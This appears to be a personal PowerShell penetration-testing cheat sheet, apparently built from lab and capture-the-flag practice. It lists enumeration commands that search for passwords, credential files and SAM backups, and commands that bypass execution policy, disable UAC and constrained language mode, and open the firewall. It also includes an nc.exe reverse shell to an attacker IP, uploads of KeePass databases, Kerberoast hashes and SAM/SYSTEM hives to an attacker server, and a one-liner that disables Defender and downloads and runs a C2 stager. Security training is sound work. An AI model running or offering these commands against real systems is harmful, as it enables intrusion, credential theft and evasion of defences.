## Powershell Basic Commands:
```
Command name	    Alias	        Description
Set-Location		cd, chdir, sl	Sets the current working location to a specified location.
Get-Content			cat, gc, type	Gets the content of the item at the specified location.
Add-Content			ac	            Adds content to the specified items, such as adding words to a file.
Set-Content			sc	            Writes or replaces the content in an item with new content.
Copy-Item			copy, cp, cpi	Copies an item from one location to another.
Remove-Item			del, erase, rd, ri, rm, rmdir	Deletes the specified items.
Move-Item			mi, move, mv	Moves an item from one location to another.
Set-Item			si	            Changes the value of an item to the value specified in the command.
New-Item			ni	            Creates a new item.
Start-Job			sajb	        Starts a Windows PowerShell background job.
Compare-Object		compare, dif	Compares two sets of objects.
Group-Object		group           Groups objects that contain the same value for specified properties.
Invoke-WebRequest	curl, iwr, wget	Gets content from a web page on the Internet.
Measure-Object		measure	        Calculates the numeric properties of objects, and the characters, words, and lines in string objects, such as files …
Resolve-Path		rvpa	        Resolves the wildcard characters in a path, and displays the path contents.
Resume-Job			rujb	        Restarts a suspended job
Set-Variable		set, sv	        Sets the value of a variable. Creates the variable if one with the requested name does not exist.
Show-Command		shcm	        Creates Windows PowerShell commands in a graphical command window.
Sort-Object			sort	        Sorts objects by property values.
Start-Service		sasv	        Starts one or more stopped services.
Start-Process		saps, start	    Starts one or more processes on the local computer.
Suspend-Job			sujb	        Temporarily stops workflow jobs.
Wait-Job			wjb	            Suppresses the command prompt until one or all of the Windows PowerShell background jobs running in the session are …
Where-Object		?, where	    Selects objects from a collection based on their property values.
Write-Output		echo, write	    Sends the specified objects to the next command in the pipeline. If the command is the last command in the pipeline,…
gci -recurse -force -file <file>    In PowerShell, ls is an alias for Get-ChildItem or gci. On windows, it’s often a good idea to run that with -force, kind of like running ls -a.
```

## View and Bypass Execution Policy:
```
View Execution Policy
$ Get-ExecutionPolicy -Scope CurrentUser
$ Get-ExecutionPolicy

Disable Execution Policy Protection for PowerShell
$ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
$ Set-ExecutionPolicy Unrestricted

Or avoid this protection for 1 command:
$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.119.1:80/file.txt}"
Execution Policy Bypass:
powershell -ExecutionPolicy Bypass -File C:\script.ps1

Bypass Execution Policy using encoding:
$command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded
```

## Ping Sweep:
```
Conduct a ping sweep:
PS C:\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | SelectString ttl}
```

## Port Scan:
```
Conduct a port scan:
PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
```


## Powershell Windows Enumeration:
```
    'Basic System Information'                    = 'Start-Process "systeminfo" -NoNewWindow -Wait';
    'Environment Variables'                       = 'Get-ChildItem Env: | ft Key,Value';
    'Network Information'                         = 'Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address';
    'DNS Servers'                                 = 'Get-DnsClientServerAddress -AddressFamily IPv4 | ft';
    'ARP cache'                                   = 'Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State';
    'Routing Table'                               = 'Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex';
    'Network Connections'                         = 'Start-Process "netstat" -ArgumentList "-ano" -NoNewWindow -Wait | ft';
    'Connected Drives'                            = 'Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft';
    'Firewall Config'                             = 'Start-Process "netsh" -ArgumentList "firewall show config" -NoNewWindow -Wait | ft';
    'Current User'                                = 'Write-Host $env:UserDomain\$env:UserName';
    'User Privileges'                             = 'start-process "whoami" -ArgumentList "/priv" -NoNewWindow -Wait | ft';
    'Local Users'                                 = 'Get-LocalUser | ft Name,Enabled,LastLogon';
    'Logged in Users'                             = 'Start-Process "qwinsta" -NoNewWindow -Wait | ft';
    'Credential Manager'                          = 'start-process "cmdkey" -ArgumentList "/list" -NoNewWindow -Wait | ft'
    'User Autologon Registry Items'               = 'Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" | select "Default*" | ft';
    'Local Groups'                                = 'Get-LocalGroup | ft Name';
    'Local Administrators'                        = 'Get-LocalGroupMember Administrators | ft Name, PrincipalSource';
    'User Directories'                            = 'Get-ChildItem C:\Users | ft Name';
    'Searching for SAM backup files'              = 'Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM';
    'Running Processes'                           = 'gwmi -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize';
    'Installed Software Directories'              = 'Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | ft Parent,Name,LastWriteTime';
    'Software in Registry'                        = 'Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name';
    'Folders with Everyone Permissions'           = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "Everyone"} } catch {}} | ft';
    'Folders with BUILTIN\User Permissions'       = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "BUILTIN\Users"} } catch {}} | ft';
    'Checking registry for AlwaysInstallElevated' = 'Test-Path -Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer" | ft';
    'Unquoted Service Paths'                      = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike ''"*''} | select PathName, DisplayName, Name | ft';
    'Scheduled Tasks'                             = 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State';
    'Tasks Folder'                                = 'Get-ChildItem C:\Windows\Tasks | ft';
    'Startup Commands'                            = 'Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl';
    'Searching for Unattend and Sysprep files'    = 'Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | Out-File C:\windows\temp\unattendfiles.txt';
    'Searching for web.config files'              = 'Get-Childitem –Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\webconfigfiles.txt';
    'Searching for other interesting files'       = 'Get-Childitem –Path C:\ -Include *password*,*cred*,*vnc* -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\otherfiles.txt';
    'Searching for various config files'          = 'Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\configfiles.txt';
    'Searching HKLM for passwords'                = 'reg query HKLM /f password /t REG_SZ /s | Out-File C:\windows\temp\hklmpasswords.txt';
    'Searching HKCU for passwords'                = 'reg query HKCU /f password /t REG_SZ /s | Out-File C:\windows\temp\hkcupasswords.txt';
    'Searching for files with passwords'          = 'Get-ChildItem -Path C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike "*C:\temp*" -and $_.PSParentPath -notlike "*Reference Assemblies*" -and $_.PSParentPath notlike "*Windows Kits*"}| Select-String -Pattern "password" | Out-File C:\windows\temp\password.txt';
```

## User Enumeration:
```
Get a list of users in the current domain:
Get-ADUser -Filter * -Properties * (Active Directory)
Get-ADUser -Identity student -properties * (Active Directory)

Get list of all properties for users in the current Domain:
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -Membertype *Property | select Name        (Active Directory)
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}    (Active Directory)
```

## PS History Files:
```
PS C:\Users\Administrator> Get-History
PS C:\Users\Administrator> Get-Content (Get-PSReadlineOption).HistorySavePath | more
```

## File Searching:
```
Search for kdbx password manager database files on the C:\ drive:
PS C:\Users\mute> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Search for sensitive .txt and .ini files in the C:\xampp directory:
PS C:\Users\mute> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
   
Search for documents and text files in the home directory of the user mute. We enter *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx as file extensions to search for and set -Path to the home directory:
Get-ChildItem -Path C:\Users\mute\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Some filetypes I like to stay on the lookout for, not windows exclusive:
php,html,htm,asp,aspx,js,xml,git,txt,pdf,zip,tar,gz,md,sh,log,md,doc,docx,xls,xlsx,json,ini,bak,jpg,jpeg,png,gif,mpg,mp3,old

Search for Unattend and Sysprep files:
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | Out-File C:\windows\temp\unattendfiles.txt

Search for web.config files:
Get-Childitem –Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\webconfigfiles.txt

Search for other interesting files:
Get-Childitem –Path C:\ -Include *password*,*cred*,*vnc* -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\otherfiles.txt

Search for various config files:
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\configfiles.txt

Search HKLM for passwords:
reg query HKLM /f password /t REG_SZ /s | Out-File C:\windows\temp\hklmpasswords.txt

Search HKCU for passwords:
reg query HKCU /f password /t REG_SZ /s | Out-File C:\windows\temp\hkcupasswords.txt'

Search for files with passwords:
Get-ChildItem -Path C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike "*C:\temp*" -and $_.PSParentPath -notlike "*Reference Assemblies*" -and $_.PSParentPath notlike "*Windows Kits*"}| Select-String -Pattern "password" | Out-File C:\windows\temp\password.txt';

Find text within a file:
PS C:\> Select-String –path c:\users\*.txt –pattern password
PS C:\> ls -r c:\users -file | %{Select-String -path $_ -pattern password}

Display file contents (cat, type, gc):
PS C:\> Get-Content file.txt
```

## Firewalls:
```
List and modify the Windows firewall rules:
PS C:\> Get-NetFirewallRule –all

Make a new NetFirewallRule named LetMeIn allowing connections from remote address:
PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25

'Firewall Config' = 'Start-Process "netsh" -ArgumentList "firewall show config" -NoNewWindow -Wait | ft';
```

## Anti-Virus: 
```
Antivirus state check:
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Domain Enumeration:
```
Get Object of another Domain:
Get-ADDomain -Identity els.local (Active Directory)

Get Domain SID for current Domain:
(Get-ADDomain).DomainSID (Active Directory)

Get Domain Controllers for the Current Domain:
Get-ADDomainController (Active Directory)

Get Domain Controllers for another Domain
Get-ADDomainController -DomainName els.local -Discover (Active Directory)
```

## Show Hotfixes:
```
Get a listing of all installed Microsoft Hotfixes:
PS C:\> Get-HotFix
```

## Enable PS Remoting:
```
First enable remoting:
Enable-PSRemoting -SkipNetworkProfileCheck -Force

Now add trusted hosts:
winrm s winrm/config/client '@{TrustedHosts="172.16.80.100"}'
winrm set winrm/config/client '@{TrustedHosts="10.100.11.102,10.100.11.250"}'
winrm s winrm/config/client '@{TrustedHosts="*"}'
```

## UAC Disable
```
Powershell disable UAC
Disable UAC
function Disable-UserAccessControl {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
    Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
}
```

## Switch PS Shell Session
```
I can use PowerShell sessions and New-PSSession to get a shell running as batman:

C:\Users\Alfred>powershell

PS C:\Users\Alfred> $username = "arkham\batman"
PS C:\Users\Alfred> $password = "Zx^#QZX+T!123"
PS C:\Users\Alfred> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\Users\Alfred> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\Alfred> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\Users\Alfred> new-pssession -computername . -credential $cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\Alfred> enter-pssession 1
[localhost]: PS C:\Users\Batman\Documents> whoami
arkham\batman

I had a lot of trouble with this shell. So I just had nc connect back as batman and get a better shell:
[localhost]: PS C:\Users\Batman\Documents> \windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.11 443 

On Kali:
root@kali# rlwrap nc -lnvp 443 
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.130.
Ncat: Connection from 10.10.10.130:49697.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Batman\Documents>
```

## Powershell File Upload (File exfiltration)
```
My preferred method for a quick file exfiltration, comes in handy for getting bloodhound .zip files back to attacking machine:
Powershell file upload
start apache
sudo systemctl start apache2

Make sure you create an uploads directory in /var/www/html
Make sure you create upload.php in /var/www/html:
┌──(kali㉿kali)-[/var/www/html]
└─$ ls
index.html  index.nginx-debian.html  upload.php  uploads <-- Uploads directory

┌──(kali㉿kali)-[/var/www/html]
└─$ cat upload.php  
<?php
    $uploadDirectory = '/var/www/html/uploads/';
    $uploadFile = $uploadDirectory . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile);
?>           

Now you can exfiltrate you file of choice from the remote target to your local machine via PS, it will save in the created uploads directory in /var/www/html/uploads.

powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.x/upload.php','Database.kdbx') <-- Exfil a .kdbx database file
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.x/upload.php','C:\Users\kiosk\hashes.kerberoast') <-- Exfil kerberoasted hashes      
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.208/upload.php', '20230914173727_BloodHound.zip') <-- Exfil Bloodhound .zip files       
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.208/upload.php', 'SAM')  <-- Exfil SAM for secretsdump.py     
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.208/upload.php', 'SYSTEM.tar') <-- Exfil system for secretsdump.py 

File too big to tranfer? Compress it
tar -cvzf archive name.tar path to folder to compress  
tar -cvzf SYSTEM.tar C:\Windows\temp\SYSTEM 
```

## Constrained Language Breakout (PSLockdownPolicy Breakout)
```
Check for constrained language mode:
$ExecutionContext.SessionState.LanguageMode

First see the environment in powershell prompt with below command:

ls env:

Then remove the key:
powershell Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy

Now start a new powershell process, and do the below:
Now look at the environment again

ls env:

There should no longer be the _PSLockdownPolicy Parameter.
```

## Disable Defender and Launch an Empire Stager
```
This works for disabling Windows Defender and running empire stager: 
powershell -exec bypass Set-MpPreference -DisableRealtimeMonitoring $true && cmd  /c "powershell -noninteractive -command IEX (New-Object Net.WebClient).DownloadString('http://cloud.c2server.net:81/file2.ps1')"
```

## Useful Misc Commands:
```
Get a process listing (ps, gps):
PS C:\> Get-Process

Get a service listing:
PS C:\> Get-Service

Formatting output of a command (Format-List):
PS C:\> ls | Format-List –property name

Paginating output:
PS C:\> ls –r | Out-Host -paging

Get the SHA1 hash of a file:
PS C:\> Get-FileHash -Algorithm SHA1 file.txt

Exporting output to CSV:
PS C:\> Get-Process | Export-Csv procs.csv 

Navigate the Windows registry:
PS C:\> cd HKLM:\
PS HKLM:\> ls

List programs set to start automatically in the registry:
PS C:\> Get-ItemProperty HKLM:\SOFTWARE
\Microsoft\Windows\CurrentVersion\run

Convert string from ascii to Base64:
PS C:\>[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))
```










